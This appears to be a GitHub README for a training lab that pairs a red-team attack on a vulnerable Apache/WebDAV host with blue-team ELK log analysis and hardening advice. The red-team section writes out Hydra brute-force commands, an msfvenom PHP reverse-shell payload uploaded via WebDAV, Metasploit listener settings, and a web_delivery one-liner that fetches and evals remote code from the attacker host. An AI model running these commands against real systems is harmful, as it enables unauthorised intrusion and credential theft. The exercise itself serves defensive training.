# Red VS Blue
## Assessment and Hardening of a Vulnerable System

We've been assigned to assess the vulnerability of a system, report on the detected activity with the current event management setup (ELK), and provide recommendations on hardening the system.

## _Network Topology_
  
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Network%20Topology.png></kbd>

## _Red Team Security Assessment_

As an initial step, the Red Team will assess the vulnerability of the system.

### Reconnaissance 

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Recon1.PNG width=700></kbd>

### Vulnerability Assessment

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Vuln.PNG width=700></kbd>

### Scans & Exploits
#### Scans
```
Scans are run against the target machine to establish attack vectors.

$ Nmap -sV 192.168.1.105
```

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Nmap1.PNG width=500></kbd>

```
$ Nmap -Pn --script vuln 192.168.1.105
```

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Nmap2.PNG width=500></kbd>

####  Part I
```
With Apache Httpd open and Webdav showing up on our scans, it was clear the server would be accessible via a browser.
Navigating to 192.168.1.105 allows us to browse through the server folders. 
There are multiple references to a "secret_folder" directory. 
There is also a list of employee names (good source for user names) as well as roles and responsibilities. 
All very useful in planning our attack.
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http1.PNG width=500></kbd>
```
Navigating to the secret_folder directory requires us to use the user name and password for Ashton.
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http2.png></kbd>
```
Cracking Ashton's password is attempted using Hydra.

$ Hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/sercret_folder
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Hydra.png></kbd>

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http3.png></kbd>

```
✨✨ Ashton's credentials acquired ✨✨

We can now access the secret_folder directory.

```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http4.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http5.png></kbd>

#### Part II
```
There are very clear instructions on how to access Webdav, which we already know is of interest from out Nmap scan.
Critically, there is also a hash along with the user account to be used.
Since they've provided which account to use (Ryan), we could attempt using Hydra once again.
However, we will first attempt to crack the hash and try using the result as Ryan's password.
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Crackstation.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http6.png></kbd>

```
✨✨ Ryan's credentials acquired ✨✨
```
#### Part III

```
With Ryan's credentials, paths open up and there are multiple attack vectors we can pursue.

The most direct method is SSH. 
It is not a particularly vulnerable service, however, with Ryan's credentials we should be able to access the machine.

$ ssh ryan@192.168.1.105

```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/ssh.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/shadow.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/flag.png></kbd>

```
✨✨ Success ✨✨
```
#### Part IV

```
The next method is to use an exploit and setup a reverse shell.
We already have access to Webdav and we can upload and run files in there through a web browser.
Therefore we create a PHP reverse shell payload using Msfvenom:

$ Msfvenom –p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 –f php > shell.php

We then need to upload the file to Webdav.
A tool called Cadaver comes in very handy for this:

$ cadaver http://192.168.1.105/webdav
  Username:
  Password:
$ put shell.php
$ exit

```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Cadaver.png></kbd>

```
Now that the payload has been uploaded, we need to set up a listener and then run the exploit.
To do that, we use the multi handler on Metasploit.

$ msfconsole
$ use multi/handler
$ set lhost 192.168.1.90
$ set lport 4444
$ set payload php/meterpreter/reverse_tcp
$ run

The next step is to navigate to the Webdav folder on the web browser where we uploaded the payload.
Click on shell.php

We now check Metasploit and see that a meterpreter session has been established.
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Http7.png></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/meterpreter1.PNG></kbd>

```
✨✨ Success. We can then proceed to privilege escalation if it's required. ✨✨
```
#### Part V

```
The final exploit is using Metasploit's web delivery script.
If the attacker has access to the target machine, which we do via Ryan's ssh, a meterpreter and shell can be established.

$ msfconsole
$ use exploit/multi/script/web_delivery
$ set target 1
$ set payload php/meterpreter/reverse_tcp
$ set lhost 192.168.1.90
$ run

This will get the exploit running and waiting for taget machine to start a connection.
To do that, the exploit provides us with the command line to use.
We could try to obfuscate this command if we were trying to be stealthy.
In this case however, we already have access vis Ryan's ssh session, so we run this command on that target machine.

$ php –d allow_url_fopen=true –r “eval(file_get_contents(‘http://192.168.1.90:8080/9Jbe8KjZ’));”
```
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Webdelivery.png></kbd>

```
✨✨ Success ✨✨
```
________________________________________________________________________________________________________________________________________________________________________


## _Blue Team Log Analysis_

Elk is set up to log events occuring on the target machine.

We will be using Kibana to query, extract and visualize the events to ensure that the log is set up effectively.


- Port scan occurred at 07:56:40.016
- 11,000 packets were sent from 192.168.1.90
- This is easy to identify as a port scan because of the significant and specific number of packets sent from the same IP and from the same port. The packets are also all within a very short period of time (seconds).

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/portscan.PNG width=700></kbd>></kbd>

- There were 37,408 requests made for the hidden directory secret_folder – a clear indicator that there was a brute force attempt at accessing the hidden directory
- The file connect_to_corp_server was requested. This file holds instructions on how to access webdav as well as a hashed password.

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/Filerequested2.png width=400></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/ReqSecretFolder2.png width=400></kbd>

- During the brute force attack there was a total 37,406 requests made.
- Once the attacker had identified the correct username, it then required 10,141 attempts to discover the password.

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/bruteforce4.PNG width=400></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/bruteforce6.PNG width=400></kbd>

- There were 60 requests made to webdav directory.
- Requests were made for /webdav/shell.php and /webdav/passwd.dav

<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/webdav3.PNG width=400></kbd>
<kbd><img src=https://github.com/OmarG13/Red-VS-Blue-Assessment-and-Hardening-of-a-Vulnerable-System/blob/main/Images/webdav4.PNG width=400></kbd>




________________________________________________________________________________________________________________________________________________________________________

## _Blue Team System Hardening Recommendations_

These recommendation are specific to this particular system and this scenario. 

_However, many of these recommendations are also highly recommended on just about any system._

- Disable unused ports.
- Ensure the firewall (ufw for example) is setup correctly, and that all ports are closed to outside traffic (unless otherwise directed by managment). 
- Use TCP wrappers to log, check and restrict access.
- Strong password policy and lockouts – configure pluggable authentication module (PAM) effectively.
  - Enforce a minimum of 8 characters with different types of characters, as well as password changes every 90 days.
- Use public/private keys for SSH.
- **Do not have sensitive data on externally accessible servers.** 
- For privileged accounts use MFA, captcha or unique login URLs
- Disable webdav. There are alternatives that are more secure.
- Implement HTTPS.
- Antivirus is setup effectively and scanning all incoming files.
- Train users to recognize files that should not be there.
- Ingress filtering to block the uploads, and egress filtering to then attempt to block reverse shells as a final attempt.
- Email filtering and policies (to stop potential malicious uploads via emails).
- Application whitelisting.
- System patching.
